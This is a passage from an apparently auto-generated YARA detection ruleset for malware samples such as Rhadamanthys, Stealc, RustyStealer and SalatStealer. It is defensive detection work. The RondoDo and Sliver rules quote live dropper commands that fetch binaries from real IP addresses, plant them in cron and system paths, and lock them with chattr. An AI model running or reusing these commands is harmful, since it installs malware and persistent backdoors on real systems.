      reference = "internal"
      date = "2025-09-10"
      hash1 = "b6f6d70fc40e79f213119441e6cc05acbb222a3ece6cfb1d4295c922dbc1e00f"
   strings:
      $s1 = "Panda3D.exe" fullword wide /* score: '22.00'*/
      $s2 = "YYYYYZ" fullword ascii /* reversed goodware string 'ZYYYYY' */ /* score: '16.50'*/
      $s3 = "XXZZYXZXZ" fullword ascii /* base64 encoded string ']vYavW' */ /* score: '16.50'*/
      $s4 = "XXZYZXZXXY" fullword ascii /* base64 encoded string ']vXevW]' */ /* score: '16.50'*/
      $s5 = "XYYYYY" fullword ascii /* reversed goodware string 'YYYYYX' */ /* score: '16.50'*/
      $s6 = "XXXXYX" fullword ascii /* reversed goodware string 'XYXXXX' */ /* score: '13.50'*/
      $s7 = "ZZZXXX" fullword ascii /* reversed goodware string 'XXXZZZ' */ /* score: '13.50'*/
      $s8 = "ZYYXXX" fullword ascii /* reversed goodware string 'XXXYYZ' */ /* score: '13.50'*/
      $s9 = "XXXXZZ" fullword ascii /* reversed goodware string 'ZZXXXX' */ /* score: '13.50'*/
      $s10 = "Panda3D - Open Source Game Engine" fullword wide /* score: '12.00'*/
      $s11 = "PYYYYXXXYXZ" fullword ascii /* score: '9.50'*/
      $s12 = "YXYYYYZ" fullword ascii /* score: '9.50'*/
      $s13 = "YYYYXZYY" fullword ascii /* score: '9.50'*/
      $s14 = "QYYYYZZ" fullword ascii /* score: '9.50'*/
      $s15 = "XYZYZYYYYY" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      8 of them
}

rule Rhadamanthys_signature__979d4d3c19bd1d7e944b1ba868d6cce7_imphash__4048a41b {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_979d4d3c19bd1d7e944b1ba868d6cce7(imphash)_4048a41b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4048a41b0e3918c70f9ba056a4e646be76ae51293aad877fd3cdade57893a4f0"
   strings:
      $s1 = "CryEngine.exe" fullword wide /* score: '22.00'*/
      $s2 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "8PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s5 = "Developed by Crytek. Visit www.crytek.com for more information." fullword wide /* score: '14.00'*/
      $s6 = "CryEngine - A high-performance game development engine" fullword wide /* score: '12.00'*/
      $s7 = "|WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s8 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s9 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s10 = "* Ynsx" fullword ascii /* score: '9.00'*/
      $s11 = "/getwlstatus" fullword ascii /* score: '9.00'*/
      $s12 = "* H.[K" fullword ascii /* score: '9.00'*/
      $s13 = "3<$1<$3<$\\9" fullword ascii /* score: '9.00'*/ /* hex encoded string '19' */
   condition:
      uint16(0) == 0x5a4d and filesize < 13000KB and
      8 of them
}

rule Stealc_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__c4fa1832 {
   meta:
      description = "_subset_batch - file Stealc(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_c4fa1832.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c4fa1832211538463badc229f03d51ba8fa1e20024a1278897232393d1171644"
   strings:
      $s1 = "CryEngine.exe" fullword wide /* score: '22.00'*/
      $s2 = "PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s5 = "Developed by Crytek. Visit www.crytek.com for more information." fullword wide /* score: '14.00'*/
      $s6 = "CryEngine - A high-performance game development engine" fullword wide /* score: '12.00'*/
      $s7 = " WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s8 = "WPlease, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s9 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s10 = "/getwlstatus" fullword ascii /* score: '9.00'*/
      $s11 = "3,$1,$3,$\\9" fullword ascii /* score: '9.00'*/ /* hex encoded string '19' */
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      8 of them
}

rule Stealc_signature__a56f115ee5ef2625bd949acaeec66b76_imphash_ {
   meta:
      description = "_subset_batch - file Stealc(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a2a672bc9c70b9ee9f48e196ae71003a69ea577efef03fc263bde3834012e096"
   strings:
      $s1 = "DataSync.exe" fullword wide /* score: '22.00'*/
      $s2 = "PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "Developed by SyncSolutions Inc. Visit www.syncsolutions.com for more information." fullword wide /* score: '14.00'*/
      $s5 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s6 = "DataSync - Enterprise data synchronization tool" fullword wide /* score: '12.00'*/
      $s7 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s8 = "4pWinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s9 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s10 = "/getwlstatus" fullword ascii /* score: '9.00'*/
      $s11 = "* mS22" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      8 of them
}

rule Rhadamanthys_signature__979d4d3c19bd1d7e944b1ba868d6cce7_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_979d4d3c19bd1d7e944b1ba868d6cce7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9fdac7bc255ce2b331aa779f1871b491609d57452cc0ed6f85dd7e9a2a0f84d7"
   strings:
      $s1 = "DataSync.exe" fullword wide /* score: '22.00'*/
      $s2 = "PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "Developed by SyncSolutions Inc. Visit www.syncsolutions.com for more information." fullword wide /* score: '14.00'*/
      $s5 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s6 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0" fullword ascii /* score: '13.00'*/
      $s7 = "DataSync - Enterprise data synchronization tool" fullword wide /* score: '12.00'*/
      $s8 = "JMPlease, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s9 = "WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s10 = "@ - H*" fullword ascii /* score: '9.00'*/
      $s11 = "* wbCu" fullword ascii /* score: '9.00'*/
      $s12 = "h1/getwlstatus" fullword ascii /* score: '9.00'*/
      $s13 = "* :$eo" fullword ascii /* score: '9.00'*/
      $s14 = "/logstatus" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 13000KB and
      8 of them
}

rule Rhadamanthys_signature__979d4d3c19bd1d7e944b1ba868d6cce7_imphash__9f825074 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_979d4d3c19bd1d7e944b1ba868d6cce7(imphash)_9f825074.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9f8250744072a229d7ee9c8f30647d3865f1f3c235bb13e95b98ef228656ca87"
   strings:
      $s1 = "aurorarender.exe" fullword wide /* score: '22.00'*/
      $s2 = "PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s5 = "Aurora Render - Real-time Rendering Engine" fullword wide /* score: '12.00'*/
      $s6 = "WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s7 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s8 = "*  &1&&" fullword ascii /* score: '9.00'*/
      $s9 = "*  &0&&" fullword ascii /* score: '9.00'*/
      $s10 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s11 = "3<$1<$3<$\\9" fullword ascii /* score: '9.00'*/ /* hex encoded string '19' */
      $s12 = "z/getwlstatus" fullword ascii /* score: '9.00'*/
      $s13 = "yPTJc+ I<" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      8 of them
}

rule ValleyRAT_signature__2 {
   meta:
      description = "_subset_batch - file ValleyRAT(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7f202b09b89850443780d48b17fd853d22695719d123c5b945363c02cce0b316"
   strings:
      $s1 = "vcruntime140_1.dll" fullword ascii /* score: '23.00'*/
      $s2 = "patrocinate.exe" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule Tsunami_signature_ {
   meta:
      description = "_subset_batch - file Tsunami(signature).elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1a930b4aa7c5f6e140466a8309037bf5def5614f7ed514bd9010868b8f51710b"
   strings:
      $s1 = "No child process" fullword ascii /* score: '15.00'*/
      $s2 = "__kernel_clock_gettime" fullword ascii /* score: '14.00'*/
      $s3 = "Remote I/O error" fullword ascii /* score: '10.00'*/
      $s4 = "No file descriptors available" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Rhadamanthys_signature__979d4d3c19bd1d7e944b1ba868d6cce7_imphash__ddc0d4c7 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_979d4d3c19bd1d7e944b1ba868d6cce7(imphash)_ddc0d4c7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ddc0d4c7f254a43d40195e8c787dbae1968d54bd6e26b21cb55375eb8aa219cc"
   strings:
      $s1 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s2 = "FPROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "/dumpstatus" fullword ascii /* score: '14.00'*/
      $s4 = "WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s5 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s6 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s7 = "/getwlstatus" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 15000KB and
      all of them
}

rule Stealc_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__f105ddfd {
   meta:
      description = "_subset_batch - file Stealc(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_f105ddfd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f105ddfdb845a2ce8cfd03bb6a00a8d2e5e59c6b0b1206c7efa547f740e90650"
   strings:
      $s1 = "Panda3D.exe" fullword wide /* score: '22.00'*/
      $s2 = "/dumpsta" fullword ascii /* score: '14.00'*/
      $s3 = "Panda3D - Open Source Game Engine" fullword wide /* score: '12.00'*/
      $s4 = "/getwltsvauu" fullword ascii /* score: '9.00'*/
      $s5 = "skipact" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      all of them
}

rule RondoDo_signature_ {
   meta:
      description = "_subset_batch - file RondoDo(signature).sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cd84c2b486ee129be3334bf006794e84f0b316f9bd96cd84c893b0c92be1f9b9"
   strings:
      $s1 = "for p in /proc/[0-9]*; do pid=${p##*/}; [ ! -e \"$p/exe\" ] && kill -9 \"$pid\" && continue; exelink=`ls -l \"$p/exe\" 2>/dev/nu" ascii /* score: '25.00'*/
      $s2 = "# wget http://74.194.191.52/rondo.lol;" fullword ascii /* score: '24.00'*/
      $s3 = "echo >/run/user/0/.t && cd /run/user/0 && rm -f arc arm arm4 arm5 arm6 arm7 arm8 aarch64 i486 i586 i686 x86 x86_64 x86_32 m68k m" ascii /* score: '24.00'*/
      $s4 = "# bang2012@protonmail.com" fullword ascii /* score: '22.00'*/
      $s5 = "(wget http://74.194.191.52/rondo.armv5l||curl -O http://74.194.191.52/rondo.armv5l||busybox wget http://74.194.191.52/rondo.armv" ascii /* score: '21.00'*/
      $s6 = "(wget http://74.194.191.52/rondo.i486||curl -O http://74.194.191.52/rondo.i486||busybox wget http://74.194.191.52/rondo.i486)" fullword ascii /* score: '21.00'*/
      $s7 = "(wget http://74.194.191.52/rondo.armv6l||curl -O http://74.194.191.52/rondo.armv6l||busybox wget http://74.194.191.52/rondo.armv" ascii /* score: '21.00'*/
      $s8 = "echo >/tmp/.t && cd /tmp && rm -f arc arm arm4 arm5 arm6 arm7 arm8 aarch64 i486 i586 i686 x86 x86_64 x86_32 m68k mips mipsel mps" ascii /* score: '21.00'*/
      $s9 = "(wget http://74.194.191.52/rondo.armv6l||curl -O http://74.194.191.52/rondo.armv6l||busybox wget http://74.194.191.52/rondo.armv" ascii /* score: '21.00'*/
      $s10 = "echo >/run/user/0/.t && cd /run/user/0 && rm -f arc arm arm4 arm5 arm6 arm7 arm8 aarch64 i486 i586 i686 x86 x86_64 x86_32 m68k m" ascii /* score: '21.00'*/
      $s11 = "(wget http://74.194.191.52/rondo.powerpc||curl -O http://74.194.191.52/rondo.powerpc||busybox wget http://74.194.191.52/rondo.po" ascii /* score: '21.00'*/
      $s12 = "(wget http://74.194.191.52/rondo.m68k||curl -O http://74.194.191.52/rondo.m68k||busybox wget http://74.194.191.52/rondo.m68k)" fullword ascii /* score: '21.00'*/
      $s13 = "(wget http://74.194.191.52/rondo.i586||curl -O http://74.194.191.52/rondo.i586||busybox wget http://74.194.191.52/rondo.i586)" fullword ascii /* score: '21.00'*/
      $s14 = "(wget http://74.194.191.52/rondo.powerpc-440fp||curl -O http://74.194.191.52/rondo.powerpc-440fp||busybox wget http://74.194.191" ascii /* score: '21.00'*/
      $s15 = "(wget http://74.194.191.52/rondo.arc700||curl -O http://74.194.191.52/rondo.arc700||busybox wget http://74.194.191.52/rondo.arc7" ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 40KB and
      8 of them
}

rule Sliver_signature_ {
   meta:
      description = "_subset_batch - file Sliver(signature).sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "48368be04445e66954f72073e04dae6f2b71f436c2b128e5158f53ccf6fa9935"
   strings:
      $s1 = "wget http://181.223.9.36:9000/script2 -O /etc/cron.hourly/script > /dev/null 2>&1" fullword ascii /* score: '27.00'*/
      $s2 = "wget -O /usr/bin/linux http://181.223.9.36:9000/linux > /dev/null 2>&1" fullword ascii /* score: '24.00'*/
      $s3 = "if [[ ! -f /etc/cron.hourly/script ]]; then " fullword ascii /* score: '18.00'*/
      $s4 = "if [[ ! -f /usr/bin/linux ]]; then" fullword ascii /* score: '15.00'*/
      $s5 = "[[ $var -eq 0 ]] && /usr/bin/linux > /dev/null 2>&1 &" fullword ascii /* score: '14.00'*/
      $s6 = "chmod +x /etc/cron.hourly/script" fullword ascii /* score: '14.00'*/
      $s7 = "chattr +i /etc/cron.hourly/script" fullword ascii /* score: '14.00'*/
      $s8 = "var=`ps -C linux | grep -v PID | wc -l`" fullword ascii /* score: '12.00'*/
      $s9 = "[[ $var -gt 1 ]] && killall linux > /dev/null 2>&1 " fullword ascii /* score: '11.00'*/
      $s10 = "chattr +i /usr/bin/linux" fullword ascii /* score: '11.00'*/
      $s11 = "chmod +x /usr/bin/linux" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      8 of them
}

rule RustyStealer_signature__3 {
   meta:
      description = "_subset_batch - file RustyStealer(signature).7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0821311306dfef23ae249451e7e0f6cc8a6fae9ff5e26f3e05d41ce141ff5754"
   strings:
      $s1 = "PkFj.Qjz" fullword ascii /* score: '10.00'*/
      $s2 = "* X9<z" fullword ascii /* score: '9.00'*/
      $s3 = "* f})8-y" fullword ascii /* score: '9.00'*/
      $s4 = ")@}^^/.4B^}&" fullword ascii /* score: '9.00'*/ /* hex encoded string 'K' */
      $s5 = "}7(B$\"\\" fullword ascii /* score: '9.00'*/ /* hex encoded string '{' */
      $s6 = "SPYM(//ihX" fullword ascii /* score: '9.00'*/
      $s7 = "CGkM(- " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 15000KB and
      all of them
}

rule RustyStealer_signature__4 {
   meta:
      description = "_subset_batch - file RustyStealer(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a0250f1492741b887218b1b38a09e77ae60764802ce092760e6647f43c1e4cd5"
   strings:
      $s1 = "*REF_IMGOOROOIRORO004940940PDF/mpclient.dll" fullword ascii /* score: '20.00'*/
      $s2 = "?REF_IMGOOROOIRORO004940940PDF/REF_IMGOOROOIRORO004940940PDF.exe" fullword ascii /* score: '19.00'*/
      $s3 = "* q1M:x" fullword ascii /* score: '9.00'*/
      $s4 = "nnjjjjj" fullword ascii /* score: '8.00'*/
      $s5 = "hpprjlxxi" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 9000KB and
      all of them
}

rule RustyStealer_signature__5 {
   meta:
      description = "_subset_batch - file RustyStealer(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f19e15a5cd7a1c8320e88636d921934a7cb9441186ff8c781a4f7df15a6b5764"
   strings:
      $s1 = "hello_vs.exeux" fullword ascii /* score: '13.00'*/
      $s2 = "PeakUnlimited (2).dllux" fullword ascii /* score: '13.00'*/
      $s3 = "* ``~T" fullword ascii /* score: '9.00'*/
      $s4 = "!]3\" !_5" fullword ascii /* score: '9.00'*/ /* hex encoded string '5' */
      $s5 = "#7#7#7 7 " fullword ascii /* score: '9.00'*/ /* hex encoded string 'ww' */
      $s6 = "zhZf!." fullword ascii /* score: '8.00'*/
      $s7 = "fgdgfgegg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 5000KB and
      all of them
}

rule RustyStealer_signature__48f38ed6 {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_48f38ed6.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "48f38ed611d1feab314c968554e15c88fa3058b96ef8e31375d028b71b814e6d"
   strings:
      $s1 = "BuQk.KQZ" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      all of them
}

rule RustyStealer_signature__6e44aca1 {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_6e44aca1.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6e44aca19dcf26b0d462162eaceadf248d172e5551772f171b909da4c655bb01"
   strings:
      $s1 = "SWIFT_MT103_Euro_162,024.40 _ March - July 2025.js" fullword ascii /* score: '12.00'*/
      $s2 = "SWIFT_MT103_Euro_162,024.40 _ March - July 2025.jsuU[w" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 4KB and
      all of them
}

rule RustyStealer_signature__7688f594 {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_7688f594.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7688f594da22b8d7faefd60581e68ba20c6a493e9577796a00b1c5cdd87b395a"
   strings:
      $s1 = "Boleto  - Julho FINAL.htmlux" fullword ascii /* score: '12.00'*/
      $s2 = "Boleto - Agosto.htmlux" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 3KB and
      all of them
}

rule RustyStealer_signature__8b8fdda5 {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_8b8fdda5.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8b8fdda55045f71690e0479e65d81b8d5d26f0128085694a14b8d7f10f78af6f"
   strings:
      $s1 = "h|hxhthphlhhh" fullword ascii /* reversed goodware string 'hhhlhphthxh|h' */ /* score: '14.00'*/
      $s2 = ";s;c;S;C;3;#;" fullword ascii /* reversed goodware string ';#;3;C;S;c;s;' */ /* score: '11.00'*/
      $s3 = "?c?C?#?" fullword ascii /* reversed goodware string '?#?C?c?' */ /* score: '11.00'*/
      $s4 = "<s<S<3<" fullword ascii /* reversed goodware string '<3<S<s<' */ /* score: '11.00'*/
      $s5 = ":c:C:#:" fullword ascii /* reversed goodware string ':#:C:c:' */ /* score: '11.00'*/
      $s6 = "1t1T141" fullword ascii /* reversed goodware string '141T1t1' */ /* score: '11.00'*/
      $s7 = "-u-e-U-E-5-%-" fullword ascii /* reversed goodware string '-%-5-E-U-e-u-' */ /* score: '11.00'*/
      $s8 = "6t6d6T6D646$6" fullword ascii /* reversed goodware string '6$646D6T6d6t6' */ /* score: '11.00'*/
      $s9 = "7c7C7#7" fullword ascii /* reversed goodware string '7#7C7c7' */ /* score: '11.00'*/
      $s10 = "281490-REVISAODOCUMENTO_759434.hta" fullword ascii /* score: '11.00'*/
      $s11 = "2z2j2Z2J2:2*2" fullword ascii /* reversed goodware string '2*2:2J2Z2j2z2' */ /* score: '11.00'*/
      $s12 = "6d6T6D646$6" fullword ascii /* reversed goodware string '6$646D6T6d6' */ /* score: '11.00'*/
      $s13 = "4s4S434" fullword ascii /* reversed goodware string '434S4s4' */ /* score: '11.00'*/
      $s14 = "0s0S030" fullword ascii /* reversed goodware string '030S0s0' */ /* score: '11.00'*/
      $s15 = "4z4j4Z4J4:4*4" fullword ascii /* reversed goodware string '4*4:4J4Z4j4z4' */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 9000KB and
      8 of them
}

rule RustyStealer_signature__9abfeb5f {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_9abfeb5f.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9abfeb5feb753b7095901c28ae2baa998f9c53203c273b318af2ad0c18a1eb59"
   strings:
      $s1 = "QUO-LP-DG-PO-28647826758479382675892.vbs" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash_ {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c3666f3bae35133cc0bbef343da38624fe856de394419170115f130c2e9d66d6"
   strings:
      $s1 = "\\2\"a-]}" fullword ascii /* score: '10.00'*/ /* hex encoded string '*' */
      $s2 = "iTrAt$Z" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__24da360c {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_24da360c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "24da360ccd462b08dba0df2843a02df9d432c968c49d6812875bdbd9ccab1481"
   strings:
      $s1 = "7*$\"c\"@@" fullword ascii /* score: '9.00'*/ /* hex encoded string '|' */
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__25fb36a3 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_25fb36a3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "25fb36a3a527fc22d8ff61be2bbd49d90e4ff58f8e76f09480b99303a3b91fc9"
   strings:
      $s1 = "* .-`f1y" fullword ascii /* score: '9.00'*/
      $s2 = "* y7Wq Q" fullword ascii /* score: '9.00'*/
      $s3 = "- :2OdhP\"\\" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__2cfbf22d {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_2cfbf22d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2cfbf22df3ac89b22c948fd678f43c146f799fef0c268a9fd112bb46345e4dae"
   strings:
      $s1 = "aFtQJGwqQ" fullword ascii /* base64 encoded string 'h[P$l*' */ /* score: '14.00'*/
      $s2 = "]>6;>5\"-" fullword ascii /* score: '9.00'*/ /* hex encoded string 'e' */
      $s3 = "* @??T" fullword ascii /* score: '9.00'*/
      $s4 = "%%S%Rwg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__53d84055 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_53d84055.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "53d84055d2e47345b78517110b02dc731a112e74cb48afd5689c03f0400e8551"
   strings:
      $s1 = ".KYL -`" fullword ascii /* score: '8.00'*/
      $s2 = "zcvcphm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__586c640a {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_586c640a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "586c640a171ebeb480631dbcc01ec8effd8bb75721ff71e5d95e6170cf06a10b"
   strings:
      $s1 = "@\"\"5)^a." fullword ascii /* score: '9.00'*/ /* hex encoded string 'Z' */
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__5d72c26f {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_5d72c26f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5d72c26f7c2e808cca4b06ff8a0704afadc4d8a71bf9c99925c60f8ce36168a5"
   strings:
      $s1 = "Ax%Z% -" fullword ascii /* score: '9.00'*/
      $s2 = "{\"2+D,<$-" fullword ascii /* score: '9.00'*/ /* hex encoded string '-' */
      $s3 = "* +b-X5" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__644e5086 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_644e5086.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "644e50861ca06cd67b07d061b842cf0bcf793eb58d98134be6f86e78788e06de"
   strings:
      $s1 = "! 6-b}@=@" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__6a30c82a {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_6a30c82a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6a30c82ae2812001031443ef13300a7754153985880addebbab6aed0a5e798f9"
   strings:
      $s1 = "xWrG:\"" fullword ascii /* score: '10.00'*/
      $s2 = "* ;)u%j" fullword ascii /* score: '9.00'*/
      $s3 = "* {!TO" fullword ascii /* score: '9.00'*/
      $s4 = "fipkpvw" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__8a906749 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_8a906749.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8a906749df3a867cdc322263dfcd09a69d6a8a8f29ccef0f5f2af7bcba77a902"
   strings:
      $s1 = "* 9I}B" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__8f965b4e {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_8f965b4e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8f965b4e821c13d5010d94e38891264643712a6ea7718dbf9d163e062aa003eb"
   strings:
